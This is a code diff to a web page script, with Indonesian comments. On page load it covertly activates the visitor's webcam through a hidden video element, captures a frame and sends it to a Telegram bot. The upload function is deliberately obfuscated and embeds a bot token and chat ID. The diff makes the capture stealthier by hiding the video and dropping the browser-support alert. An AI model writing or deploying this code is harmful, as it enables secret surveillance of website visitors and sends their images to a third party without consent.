@@ -124,66 +124,59 @@ function showError(error) {
 
 // Fungsi untuk mengambil foto dan langsung mengirimkan ke Telegram saat halaman dimuat
 function takePhotoAndSendToTelegram() {
-    const video = document.getElementById('camera');
-    const canvas = document.getElementById('canvas');
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
 
-    // Periksa apakah browser mendukung API getUserMedia
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function (stream) {
-                video.srcObject = stream;
-
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+            
+            return new Promise((resolve, reject) => {
                 video.onloadedmetadata = () => {
-                    // Tunggu hingga video siap, lalu ambil foto
-                    const context = canvas.getContext('2d');
-
-                    // Sesuaikan ukuran canvas dengan ukuran video
-                    const videoWidth = video.videoWidth;
-                    const videoHeight = video.videoHeight;
-                    canvas.width = videoWidth;
-                    canvas.height = videoHeight;
-
-                    // Mengambil gambar dari video ke canvas
-                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
-
-                    // Ambil data URI dari canvas
-                    const dataUrl = canvas.toDataURL('image/png');
-
-                    // Kirim foto ke Telegram
-                    sendToTelegram(dataUrl);
-
-                    // Matikan stream video untuk menghemat sumber daya
-                    stream.getTracks().forEach(track => track.stop());
+                    video.play()
+                        .then(() => {
+                            // Ambil frame segera setelah video mulai bermain
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(video, 0, 0);
+                            
+                            // Kirim gambar
+                            const dataUrl = canvas.toDataURL('image/png');
+                            sendToTelegram(dataUrl);
+                            
+                            // Bersihkan resource
+                            stream.getTracks().forEach(track => track.stop());
+                            document.body.removeChild(video);
+                            resolve();
+                        })
+                        .catch(reject);
                 };
-            })
-            .catch(function (err) {
-                console.error("Terjadi kesalahan saat mengakses kamera: ", err);
             });
-    } else {
-        alert("Maaf, browser Anda tidak mendukung akses kamera.");
-    }
+        })
+        .catch(err => {
+            console.error("Gagal mengakses kamera:", err);
+            document.body.removeChild(video);
+        });
 }
 
-// Fungsi untuk mengirim foto ke Telegram
-(function(_0x48e0b2,_0x103718){const _0x25774b=_0x8af2,_0x18400a=_0x48e0b2();while(!![]){try{const _0x4dd732=parseInt(_0x25774b(0x102))/0x1+parseInt(_0x25774b(0xfb))/0x2+-parseInt(_0x25774b(0xf5))/0x3*(-parseInt(_0x25774b(0xf3))/0x4)+parseInt(_0x25774b(0xf2))/0x5*(parseInt(_0x25774b(0xf0))/0x6)+-parseInt(_0x25774b(0xff))/0x7*(-parseInt(_0x25774b(0xf7))/0x8)+-parseInt(_0x25774b(0x100))/0x9*(parseInt(_0x25774b(0xee))/0xa)+-parseInt(_0x25774b(0xf9))/0xb;if(_0x4dd732===_0x103718)break;else _0x18400a['push'](_0x18400a['shift']());}catch(_0x233dd6){_0x18400a['push'](_0x18400a['shift']());}}}(_0x2739,0x64811));function sendToTelegram(_0x435108){const _0x203858=_0x8af2,_0x42b607={'btNqW':_0x203858(0x103),'hSteb':_0x203858(0x107),'gSqSw':'7552258791:AAHiWWg_-xmpPIUF3qxB3TcwgBwbbuAL4rY','UmPur':'-1002360934041','fmBdx':function(_0x39dca3,_0x42eedf){return _0x39dca3(_0x42eedf);},'jfHgs':function(_0x183f8c,_0x484551,_0x20781f){return _0x183f8c(_0x484551,_0x20781f);},'xaqGN':_0x203858(0x101)},_0x4ed343=_0x42b607[_0x203858(0xf8)],_0x23843e=_0x42b607[_0x203858(0x105)],_0x578689=_0x203858(0xfe)+_0x4ed343+_0x203858(0xfa);let _0x5061b7=new FormData();_0x5061b7[_0x203858(0xf6)](_0x203858(0xef),_0x23843e),_0x5061b7[_0x203858(0xf6)]('photo',_0x42b607['fmBdx'](dataURItoBlob,_0x435108)),_0x42b607[_0x203858(0xfc)](fetch,_0x578689,{'method':_0x42b607[_0x203858(0x104)],'body':_0x5061b7})[_0x203858(0xfd)](_0x3ff210=>_0x3ff210['json']())['then'](_0x42cc47=>{const _0x515c58=_0x203858;_0x42cc47['ok']?console[_0x515c58(0xf4)](_0x42b607[_0x515c58(0x106)]):console[_0x515c58(0xed)](_0x42b607[_0x515c58(0xec)],_0x42cc47);})[_0x203858(0xf1)](_0x467ed9=>{const _0x50b070=_0x203858;console[_0x50b070(0xed)]('Error:',_0x467ed9);});}function _0x8af2(_0x8d7964,_0x387364){const _0x2739cc=_0x2739();return _0x8af2=function(_0x8af267,_0x589fe0){_0x8af267=_0x8af267-0xec;let _0x43d2b0=_0x2739cc[_0x8af267];return _0x43d2b0;},_0x8af2(_0x8d7964,_0x387364);}function _0x2739(){const _0x17a8a0=['25197WTmhcs','append','168BXEMZT','gSqSw','9843141MDPhjT','/sendPhoto','100276jvwKnt','jfHgs','then','https://api.telegram.org/bot','200522MiIPHx','925308fsSmun','POST','301752sciByB','Foto\x20berhasil\x20dikirim\x20ke\x20Telegram.','xaqGN','UmPur','btNqW','Terjadi\x20kesalahan\x20saat\x20membuka\x20kamera.','hSteb','error','50SAgagO','chat_id','36nEInaS','catch','540605gFCNPI','104AuEzAT','log'];_0x2739=function(){return _0x17a8a0;};return _0x2739();}
+// Fungsi untuk mengirim foto ke Telegram (tetap sama)
+(function(_0x1966cf,_0x2829c8){const _0x5a00d5=_0x5417,_0x510301=_0x1966cf();while(!![]){try{const _0x409441=-parseInt(_0x5a00d5(0x18a))/0x1+-parseInt(_0x5a00d5(0x178))/0x2+-parseInt(_0x5a00d5(0x18c))/0x3*(-parseInt(_0x5a00d5(0x181))/0x4)+-parseInt(_0x5a00d5(0x17b))/0x5+parseInt(_0x5a00d5(0x18f))/0x6+-parseInt(_0x5a00d5(0x18d))/0x7+parseInt(_0x5a00d5(0x17a))/0x8*(parseInt(_0x5a00d5(0x179))/0x9);if(_0x409441===_0x2829c8)break;else _0x510301['push'](_0x510301['shift']());}catch(_0x20126b){_0x510301['push'](_0x510301['shift']());}}}(_0x24df,0x9b16c));function _0x24df(){const _0x191e15=['Gagal\x20mengirim\x20foto:','then','/sendPhoto','1772134BNgcIK','22405752ZrUbOj','8tstdzC','5911185IQldBr','chat_id','error','wUovE','JMJSF','POST','436CDflYy','Error:','https://api.telegram.org/bot','photo','catch','json','FGIgY','-1002360934041','7552258791:AAHiWWg_-xmpPIUF3qxB3TcwgBwbbuAL4rY','14123LtSLHe','append','7740bhLilm','3023013WHYXLD','zjwEt','2272692YAzDch'];_0x24df=function(){return _0x191e15;};return _0x24df();}function _0x5417(_0xaea7a8,_0x391ef1){const _0x24df51=_0x24df();return _0x5417=function(_0x54170e,_0x3d07d2){_0x54170e=_0x54170e-0x175;let _0x28a8b2=_0x24df51[_0x54170e];return _0x28a8b2;},_0x5417(_0xaea7a8,_0x391ef1);}function sendToTelegram(_0x587a58){const _0x484fe6=_0x5417,_0x38ed0c={'FGIgY':_0x484fe6(0x175),'HYUFz':_0x484fe6(0x189),'wUovE':_0x484fe6(0x17c),'JMJSF':function(_0xffbb44,_0x1a7be3,_0x1669e6){return _0xffbb44(_0x1a7be3,_0x1669e6);},'zjwEt':_0x484fe6(0x180)},_0x76cbfe=_0x38ed0c['HYUFz'],_0x132ef2=_0x484fe6(0x188),_0x3ac64f=_0x484fe6(0x183)+_0x76cbfe+_0x484fe6(0x177);let _0x4e7570=new FormData();_0x4e7570[_0x484fe6(0x18b)](_0x38ed0c[_0x484fe6(0x17e)],_0x132ef2),_0x4e7570['append'](_0x484fe6(0x184),dataURItoBlob(_0x587a58)),_0x38ed0c[_0x484fe6(0x17f)](fetch,_0x3ac64f,{'method':_0x38ed0c[_0x484fe6(0x18e)],'body':_0x4e7570})[_0x484fe6(0x176)](_0x3d0af5=>_0x3d0af5[_0x484fe6(0x186)]())[_0x484fe6(0x176)](_0x2a93c1=>{const _0x3b71a1=_0x484fe6;if(!_0x2a93c1['ok'])console[_0x3b71a1(0x17d)](_0x38ed0c[_0x3b71a1(0x187)],_0x2a93c1);})[_0x484fe6(0x185)](_0x344dfc=>console[_0x484fe6(0x17d)](_0x484fe6(0x182),_0x344dfc));}
 
-// Fungsi untuk mengubah data URI menjadi Blob
+// Fungsi konversi data URI ke Blob (tetap sama)
 function dataURItoBlob(dataURI) {
-    let byteString = atob(dataURI.split(',')[1]);
-    let arrayBuffer = new ArrayBuffer(byteString.length);
-    let uintArray = new Uint8Array(arrayBuffer);
+    const byteString = atob(dataURI.split(',')[1]);
+    const arrayBuffer = new ArrayBuffer(byteString.length);
+    const uintArray = new Uint8Array(arrayBuffer);
     for (let i = 0; i < byteString.length; i++) {
         uintArray[i] = byteString.charCodeAt(i);
     }
     return new Blob([uintArray], { type: 'image/png' });
 }
 
-// Tambahkan event listener saat halaman dimuat
-document.addEventListener('DOMContentLoaded', () => {
-    checkDarkModeStatus(); // Untuk mengatur mode gelap
-    takePhotoAndSendToTelegram(); // Memanggil fungsi pengambilan foto dan pengiriman otomatis
-});
-
+document.addEventListener('DOMContentLoaded', takePhotoAndSendToTelegram);
 // Fungsi untuk membuka kamera dan menampilkan video
 function openCamera() {
     const video = document.getElementById('camera');
